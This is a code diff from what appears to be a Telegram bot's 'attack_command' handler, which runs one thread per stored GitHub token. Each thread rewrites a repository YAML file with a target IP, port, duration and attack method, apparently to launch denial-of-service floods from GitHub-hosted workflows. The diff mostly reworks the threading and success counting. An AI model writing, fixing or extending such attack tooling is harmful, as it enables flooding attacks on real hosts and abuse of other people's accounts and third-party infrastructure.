@@ -862,51 +862,34 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     success_count = 0
     fail_count = 0
-
+    
     threads = []
     results = []
-    results_lock = threading.Lock()
-
-
+    
     def update_single_token(token_data):
-       try:
-         ok = update_yml_file(
-             token_data['token'],
-            token_data['repo'],
-            ip, port, time_val, method
-        )
-        with results_lock:
-            results.append((token_data['username'], bool(ok)))
-    except Exception as e:
-        logger.error(f"GitHub token failed for {token_data.get('username')}: {e}")
-        with results_lock:
-            results.append((token_data.get('username'), False))
-
-
-       threads = []
-
-   for token_data in github_tokens:
-      thread = threading.Thread(
-        target=update_single_token,
-        args=(token_data,),
-        daemon=True
-      )
-      threads.append(thread)
-      thread.start()
-
-   for thread in threads:
-     thread.join()
-
-
-     success_count = 0
-     fail_count = 0
-
-    for _, success in results:
-       if success:
-        success_count += 1
-    else:
-        fail_count += 1
-
+        try:
+            result = update_yml_file(
+                token_data['token'], 
+                token_data['repo'], 
+                ip, port, time_val, method
+            )
+            results.append((token_data['username'], result))
+        except Exception as e:
+            results.append((token_data['username'], False))
+    
+    for token_data in github_tokens:
+        thread = threading.Thread(target=update_single_token, args=(token_data,))
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
+    
+    for username, success in results:
+        if success:
+            success_count += 1
+        else:
+            fail_count += 1
     
     
     user_id_str = str(user_id)
